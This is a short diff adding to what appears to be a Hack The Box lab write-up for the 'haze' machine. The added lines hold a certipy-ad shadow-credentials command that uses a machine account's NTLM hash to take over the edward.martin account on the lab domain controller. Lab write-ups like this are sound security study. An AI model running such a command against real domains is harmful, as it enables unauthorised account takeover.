@@ -541,3 +541,7 @@ Password can't be changed before -1 day, 7:55:46.122722 because of the minimum p
 So i cannot abuse `ForceChangePassword` for some reason here
 
 So ill have to abuse shadow credentials here
+
+```python
+faketime '00:30:18.253096' certipy-ad shadow auto -u 'haze-it-backup$@haze.htb' -hashes ':76da32697ff38bc7c9fa6289abf47940' -account 'edward.martin' -debug -dc-host dc01.haze.htb -dc-ip 10.129.12.135 -target dc01.haze.htb
+```
